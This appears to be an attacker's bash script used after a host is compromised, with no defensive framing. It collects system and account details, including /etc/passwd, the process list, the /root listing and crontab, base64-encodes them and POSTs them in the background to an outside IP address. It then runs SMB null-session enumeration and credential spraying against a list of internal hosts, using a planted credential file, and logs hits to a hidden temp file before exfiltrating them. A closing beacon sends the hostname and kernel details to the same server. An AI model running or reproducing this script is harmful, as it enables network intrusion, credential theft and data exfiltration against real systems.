#!/bin/bash
# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
# smbclient-based enum: null sessions first, then cred spray with incremental POST
O=/tmp/.SWP.txt
: > "$O"
HOSTS="10.61.10.10 10.61.10.11 10.61.10.12 10.61.10.15 10.61.10.24 10.61.10.102 10.61.10.119"
post(){ bash /tmp/.ex.sh "$O" "swp$1"; }
for ip in $HOSTS; do
  echo "== $ip null -L ==" >> "$O"
  timeout 12 smbclient -L "//$ip" -N >> "$O" 2>&1
done
post a
# dedupe spray: unique user:pass list from /tmp/.dc.txt (put by us)
while IFS=: read -r U P; do
  [ -z "$U" ] && continue
  for ip in $HOSTS; do
    r=$(timeout 12 smbclient -L "//$ip" -U "$U%$P" -W MLT 2>&1)
    if echo "$r" | grep -q "Sharename"; then
      echo "!!! HIT $ip $U $P" >> "$O"
      echo "$r" >> "$O"
      post "hit$(date +%s)"
    else
      e=$(echo "$r" | head -1)
      case "$e" in *NT_STATUS_LOGON_FAILURE*|*NT_STATUS_LOGON_FAILURE*) ;; *) echo "$ip $U => ${e:0:60}" >> "$O";; esac
    fi
  done
done < /tmp/.dc.txt
echo SWP_DONE >> "$O"
post final
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1


